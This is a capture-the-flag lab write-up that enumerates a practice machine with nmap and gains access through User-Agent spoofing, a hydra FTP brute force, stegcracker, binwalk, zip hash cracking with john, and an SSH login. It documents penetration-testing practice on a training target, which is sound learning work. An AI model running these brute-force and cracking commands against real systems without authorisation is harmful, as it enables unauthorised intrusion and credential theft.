# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

> [!check]- How many open ports?
> 3

# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 21,22,80 -oN nmap_enum
```
## OS
Linux, Ubuntu
## Port 22 - SSH
tcp open  ssh     **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (**Ubuntu Linux;** protocol 2.0)
## Port 21 - FTP
tcp open  ftp     **vsftpd 3.0.3**
## Port 80 - HTTP
tcp open  http    **Apache httpd 2.4.29** ((Ubuntu))

> [!check]- How you redirect yourself to a secret page?
> User-Agent

Use a User-Agent swicher pluggin or BurpSuite to change the name of the *User-Agent* to *C*
![Pasted image 20250107191057.png](/img/user/attachments/Pasted%20image%2020250107191057.png)

The server response with a *302* code, so it'will redirect, we need to press on the bottom.

Now we know that the agent *J* exists and the agent *C*'s password its weak.

# Exploitation
Done enumerate the machine? Time to brute your way out.
## Port 21 - FTP
```shell
hydra -f -V -t 64 -l chris -P /usr/share/wordlists/rockyou.txt 10.10.32.160 ftp  
```

> [!check]- FTP password

Login and download the files
![Pasted image 20250107192657.png|600](/img/user/attachments/Pasted%20image%2020250107192657.png)

![Pasted image 20250107192926.png](/img/user/attachments/Pasted%20image%2020250107192926.png)

It suggests steganography 
## Steganography
I'll try to brute force the file *cute-alien.jpg* with *stegcracker*
```shell
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```
It works

> [!check] steg password
> ![Pasted image 20250108091310.png|600](/img/user/attachments/Pasted%20image%2020250108091310.png)

Extract with *steghide* using the password from above
```shell
steghide extract -sf cute-alien.jpg
```
![Pasted image 20250108091425.png|400](/img/user/attachments/Pasted%20image%2020250108091425.png)
Read the *message.txt*

Extract data from *cutie.png*
```shell
binwalk -e cutie.png
```
![Pasted image 20250108211414.png|500](/img/user/attachments/Pasted%20image%2020250108211414.png)

The file *8702.zip* is password protected, we need to get the hash to crack it.

Get the hash
```shell
zip2john 8702.zip > hash1 
```

Crack the hash
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash1
```

> ![Pasted image 20250108213540.png](/img/user/attachments/Pasted%20image%2020250108213540.png)

Extract the file
```shell
7z x 8702.zip
```
We have a new file *To_agentR.txt*, the past file was empty.
![Pasted image 20250108214905.png|500](/img/user/attachments/Pasted%20image%2020250108214905.png)

The code is a base64 code
```shell
echo "Q*****x" | base64 -d
```
![Pasted image 20250108215333.png|300](/img/user/attachments/Pasted%20image%2020250108215333.png)
This is the same password founded above with the tool *stegcracker*
## SSH login
```shell
ssh james@10.10.125.163
```

We also have an image *Alien_autospy.jpg*
Download it and search info to get the flag
